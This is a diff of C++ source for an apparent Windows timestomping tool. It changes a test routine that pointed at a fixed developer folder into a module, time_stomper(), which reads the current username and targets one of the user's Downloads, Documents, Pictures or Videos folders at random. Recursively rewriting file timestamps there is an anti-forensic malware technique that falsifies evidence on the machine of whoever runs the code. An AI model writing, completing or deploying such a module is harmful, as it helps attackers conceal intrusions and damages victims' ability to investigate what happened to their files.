@@ -3,6 +3,7 @@
 #include <string>
 #include <random>
 #include <stdlib.h>
+#include <modules/time-stomper.hpp>
 
 WORD devurandom( int range_min, int range_max)  
 {  
@@ -139,8 +140,10 @@ DWORD timestomp_recursive(std::string path, SYSTEMTIME m_st, SYSTEMTIME a_st, SY
 	return 1;
 }
 
-int main(){
-    std::string path = "C:\\Users\\Ken_n\\Desktop\\Test";
+void time_stomper(){
+	std::string username = getenv("username");
+	const char *dirs[4] = {"Downloads", "Documents", "Pictures", "Videos"};
+	std::string path = "C:\\Users\\" + username + "\\" +  dirs[rand() % 4];
     SYSTEMTIME m_st;
 	SYSTEMTIME a_st;
 	SYSTEMTIME c_st;
